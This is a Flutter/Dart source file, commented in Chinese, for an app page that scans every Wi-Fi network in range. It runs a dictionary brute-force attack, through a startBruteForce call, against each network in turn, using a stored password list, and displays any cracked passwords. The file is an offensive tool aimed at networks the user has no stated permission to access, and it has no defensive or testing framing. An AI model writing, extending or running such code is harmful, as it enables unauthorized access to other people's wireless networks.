import 'package:flutter/material.dart';
// 注意：请确保这里的文件名与你实际的 Service 和 Helper 文件名一致
import 'wifi_service.dart'; 
import 'db_helper.dart'; 

class GlobalWiFiPage extends StatefulWidget {
  const GlobalWiFiPage({super.key});

  @override
  State<GlobalWiFiPage> createState() => _GlobalWiFiPageState();
}

class _GlobalWiFiPageState extends State<GlobalWiFiPage> {
  final WifiService _wifiService = WifiService();
  final DbHelper _dbHelper = DbHelper();

  List<Map<String, String>> _results = []; // 记录：SSID, 结果, 密码, 时间
  bool _isRunning = false;
  String _currentStatus = "准备就绪";
  double _totalProgress = 0.0;

  // 核心：全自动轮询逻辑
  void _runGlobalAutoDiscovery() async {
    // 1. 获取密码库数据
    final passwords = await _dbHelper.getPasswords();
    if (passwords.isEmpty) {
      _showMsg("密码库为空，请先添加密码");
      return;
    }

    setState(() {
      _isRunning = true;
      _results.clear();
      _currentStatus = "正在扫描可用 Wi-Fi...";
    });

    // 2. 获取当前环境所有 SSID
    // 假设你的 WifiService 中有获取列表的方法，如果没有，请根据你使用的插件调用获取列表逻辑
    List<String> scannableSsids = await _wifiService.getScannedSsids();

    if (scannableSsids.isEmpty) {
      setState(() {
        _isRunning = false;
        _currentStatus = "未发现任何可用热点";
      });
      return;
    }

    // 3. 开始大循环：遍历每一个 SSID
    for (int i = 0; i < scannableSsids.length; i++) {
      if (!_isRunning) break; // 支持手动停止

      String ssid = scannableSsids[i];
      setState(() {
        _currentStatus = "全量任务: ($i/${scannableSsids.length}) \n当前目标: $ssid";
        _totalProgress = i / scannableSsids.length;
      });

      // 调用之前写好的单点暴力破解逻辑
      // 它会内部轮询所有密码并返回结果
      String? foundPassword = await _wifiService.startBruteForce(ssid);

      // 4. 将结果插入列表（新结果在最上面）
      setState(() {
        _results.insert(0, {
          'ssid': ssid,
          'result': foundPassword != null ? "匹配成功" : "无匹配",
          'password': foundPassword ?? "",
          'time': DateTime.now().toString().substring(11, 19),
        });
      });

      // 稍微缓冲，防止 WiFi 模块过热或逻辑冲突
      await Future.delayed(const Duration(milliseconds: 1500));
    }

    setState(() {
      _isRunning = false;
      _totalProgress = 1.0;
      _currentStatus = "全量扫描任务完成";
    });
  }

  void _showMsg(String text) {
    if (!mounted) return;
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text(text)));
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text("全部 WiFi 自动轮询"),
        actions: [
          if (_isRunning)
            const Padding(
              padding: EdgeInsets.symmetric(horizontal: 16.0),
              child: Center(child: SizedBox(width: 20, height: 20, child: CircularProgressIndicator(strokeWidth: 2, color: Colors.white))),
            )
        ],
      ),
      body: Column(
        children: [
          // 状态显示面板
          Container(
            width: double.infinity,
            padding: const EdgeInsets.all(16),
            color: Colors.blue.withOpacity(0.05),
            child: Column(
              children: [
                Text(_currentStatus, textAlign: TextAlign.center, style: const TextStyle(fontWeight: FontWeight.bold)),
                const SizedBox(height: 10),
                LinearProgressIndicator(value: _totalProgress),
              ],
            ),
          ),
          // 结果日志列表
          Expanded(
            child: _results.isEmpty
                ? const Center(child: Text("点击下方播放按钮开始全场自动化测试", style: TextStyle(color: Colors.grey)))
                : ListView.builder(
                    itemCount: _results.length,
                    itemBuilder: (context, index) {
                      final item = _results[index];
                      bool isSuccess = item['result'] == "匹配成功";
                      return Card(
                        margin: const EdgeInsets.symmetric(horizontal: 12, vertical: 4),
                        child: ListTile(
                          leading: Icon(
                            isSuccess ? Icons.check_circle : Icons.do_not_disturb_on,
                            color: isSuccess ? Colors.green : Colors.grey,
                          ),
                          title: SelectableText(item['ssid']!),
                          subtitle: isSuccess 
                              ? SelectableText("密码: ${item['password']}", style: const TextStyle(color: Colors.green, fontWeight: FontWeight.bold))
                              : const Text("尝试了库中所有密码"),
                          trailing: Text(item['time']!, style: const TextStyle(fontSize: 12, color: Colors.grey)),
                        ),
                      );
                    },
                  ),
          ),
        ],
      ),
      floatingActionButton: FloatingActionButton(
        onPressed: _isRunning ? () => setState(() => _isRunning = false) : _runGlobalAutoDiscovery,
        child: Icon(_isRunning ? Icons.stop : Icons.play_arrow),
      ),
    );
  }
}